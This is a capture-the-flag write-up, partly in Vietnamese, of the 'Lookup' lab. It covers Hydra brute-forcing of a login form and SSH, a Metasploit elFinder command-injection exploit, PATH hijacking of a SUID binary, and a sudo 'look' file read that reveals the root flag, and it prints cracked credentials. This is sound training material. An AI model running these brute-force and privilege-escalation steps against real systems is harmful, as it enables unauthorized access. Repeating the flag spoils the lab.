---
tags:
  - rustscan
  - hydra
  - look
  - metasploit
  - path-hijack
  - SUID
  - ElFinder
difficulty: Easy
---
---
### **Overview**
### **Recon**

- Access: http://10.10.248.66 -> Redirect: https://lookup.thm/
- Config `/etc/hosts`
#### **rustscan**

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMc4hLykriw3nBOsKHJK1Y6eauB8OllfLLlztbB4tu4c9cO8qyOXSfZaCcb92uq/Y3u02PPHWq2yXOLPler1AFGVhuSfIpokEnT2jgQzKL63uJMZtoFzL3RW8DAzunrHhi/nQqo8sw7wDCiIN9s4PDrAXmP6YXQ5ekK30om9kd5jHG6xJ+/gIThU4ODr/pHAqr28bSpuHQdgphSjmeShDMg8wu8Kk/B0bL2oEvVxaNNWYWc1qHzdgjV5HPtq6z3MEsLYzSiwxcjDJ+EnL564tJqej6R69mjII1uHStkrmewzpiYTBRdgi9A3Yb+x8NxervECFhUR2MoR1zD+0UJbRA2v1LQaGg9oYnYXNq3Lc5c4aXz638wAUtLtw2SwTvPxDrlCmDVtUhQFDhyFOu9bSmPY0oGH5To8niazWcTsCZlx2tpQLhF/gS3jP/fVw+H6Eyz/yge3RYeyTv3ehV6vXHAGuQLvkqhT6QS21PLzvM7bCqmo1YIqHfT2DLi7jZxdk=
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNL/iO8JI5DrcvPDFlmqtX/lzemir7W+WegC7hpoYpkPES6q+0/p4B2CgDD0Xr1AgUmLkUhe2+mIJ9odtlWW30=
|   256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFG/Wi4PUTjReEdk2K4aFMi8WzesipJ0bp0iI0FM8AfE
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login Page
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=4/26%OT=22%CT=%CU=39144%PV=Y%DS=2%DC=T%G=N%TM=680C64C3
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=106%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M509ST11NW7%O2=M509ST11N
OS:W7%O3=M509NNT11NW7%O4=M509ST11NW7%O5=M509ST11NW7%O6=M509ST11)WIN(W1=F4B3
OS:%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M509
OS:NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R
OS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=
OS:40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID
OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
```
-> Port: 22, 80

- Access web again -> `/login.php`
![](../../../Image/Pasted%20image%2020250426114653.png)
- Khi access vào web với username và password bất kỳ -> thông báo **"wrong username and wrong password"**.
### **Initial Access**

#### **Hydra**
- Find the valid users
```
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p test123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=Wrong username" -I
```
- **-I** : skip waiting from previous session.

```
80][http-post-form] host: lookup.thm   login: admin   password: test123
[80][http-post-form] host: lookup.thm   login: jose   password: test123
```

- Find the password from jose
```
hydra -l jose -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password" -I
```

```
[STATUS] 680.00 tries/min, 680 tries in 00:01h, 999318 to do in 24:30h, 16 active
[80][http-post-form] host: lookup.thm   login: jose   password: password123
1 of 1 target successfully completed, 1 valid password found
```

- **Login**

-> `jose:password123` on login page.
-> Redirect: `files.login.thm` 
-> Update `/etc/hosts`

![](../../../Image/Pasted%20image%2020250426134046.png)
- All files contains random strings.

#### **searchsploit**

![](../../../Image/Pasted%20image%2020250426134902.png)

=> Khai thác **elFinder** bằng Metasploit. 
#### **metasploit**

Using **metasploit** to gain shell access
```
msf6> use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
msf6> set RHOSTS files.lookup.thm
msf6> set LHOST tun0
msf6> run

meterpreter> shell
```

![](../../../Image/Pasted%20image%2020250426135645.png)

Sau khi truy cập vào shell
- User hiện tại: **www-data** 


 `cat /etc/passwd`

```
cat /etc/passwd
root:x:0:0:root:/root:/usr/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
think:x:1000:1000:,,,:/home/think:/bin/bash
fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
```
-> **think** user and **root**.

`ls -la /home/think`

```
ls -la /home/think
total 40
drwxr-xr-x 5 think think 4096 Jan 11  2024 .
drwxr-xr-x 3 root  root  4096 Jun  2  2023 ..
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .bash_history -> /dev/null
-rwxr-xr-x 1 think think  220 Jun  2  2023 .bash_logout
-rwxr-xr-x 1 think think 3771 Jun  2  2023 .bashrc
drwxr-xr-x 2 think think 4096 Jun 21  2023 .cache
drwx------ 3 think think 4096 Aug  9  2023 .gnupg
-rw-r----- 1 root  think  525 Jul 30  2023 .passwords
-rwxr-xr-x 1 think think  807 Jun  2  2023 .profile
drw-r----- 2 think think 4096 Jun 21  2023 .ssh
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null
-rw-r----- 1 root  think   33 Jul 30  2023 user.txt

cat: /home/think/user.txt: Permission denied
```
-> Must change to **think** user.

### **Privileged Escalation Part 1**

- `find / -perm -4000 2>/dev/null`

```
find / -perm -4000 2>/dev/null

/snap/snapd/19457/usr/lib/snapd/snap-confine
/snap/core20/1950/usr/bin/chfn
/snap/core20/1950/usr/bin/chsh
/snap/core20/1950/usr/bin/gpasswd
/snap/core20/1950/usr/bin/mount
/snap/core20/1950/usr/bin/newgrp
/snap/core20/1950/usr/bin/passwd
/snap/core20/1950/usr/bin/su
/snap/core20/1950/usr/bin/sudo
/snap/core20/1950/usr/bin/umount
/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1950/usr/lib/openssh/ssh-keysign
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pwm
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```

#### **pwm** 
-> command is not default
-> it shows username and UID of logon user, then password of user.
-> it reads output of **id** command to extract password.
```
pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

```
find / -name pwm 2>/dev/null

/sys/class/pwm
/usr/lib/modules/5.4.0-152-generic/kernel/drivers/pwm
/usr/lib/modules/5.4.0-156-generic/kernel/drivers/pwm
/usr/sbin/pwm
/usr/src/linux-headers-5.4.0-152-generic/include/config/input/pwm
/usr/src/linux-headers-5.4.0-152-generic/include/config/pwm
/usr/src/linux-headers-5.4.0-156-generic/include/config/input/pwm
/usr/src/linux-headers-5.4.0-156-generic/include/config/pwm
/usr/src/linux-headers-5.4.0-152/drivers/pwm
/usr/src/linux-headers-5.4.0-152/include/dt-bindings/pwm
/usr/src/linux-headers-5.4.0-156/drivers/pwm
/usr/src/linux-headers-5.4.0-156/include/dt-bindings/pwm
```

- Vì lệnh **pwm** không cho nhập đường dẫn nên ta phải thực hiện **Path Hijack**.
![](../../../Image/Pasted%20image%2020250426142933.png)

```
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171
```

```
hydra -l think -P passwords.txt ssh://10.10.124.19

[22][ssh] host: 10.10.124.19   login: think   password: josemario.AKA(think)
```

-> Password: `josemario.AKA(think)`

![](../../../Image/Pasted%20image%2020250426144256.png)

### **Privileged Escalation Part 2**

![](../../../Image/Pasted%20image%2020250426144742.png)

```
think@lookup:~$ LFILE=/root/root.txt
think@lookup:~$ sudo look '' "$LFILE"
5a285a9f257e45c68bb6c9f9f57d18e8
```

-> root.txt: `5a285a9f257e45c68bb6c9f9f57d18e8`

### **Path Hijack**

- Loại kỹ thuật leo thang bằng cách chỉnh sửa biến môi trường **$PATH**, thực thi lệnh tuân theo thứ tự của biến
```
echo 'echo PWNED' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
```
-> Mỗi lần script gọi `ls` → nó sẽ chạy `/tmp/ls` của bạn → hijack thành công.
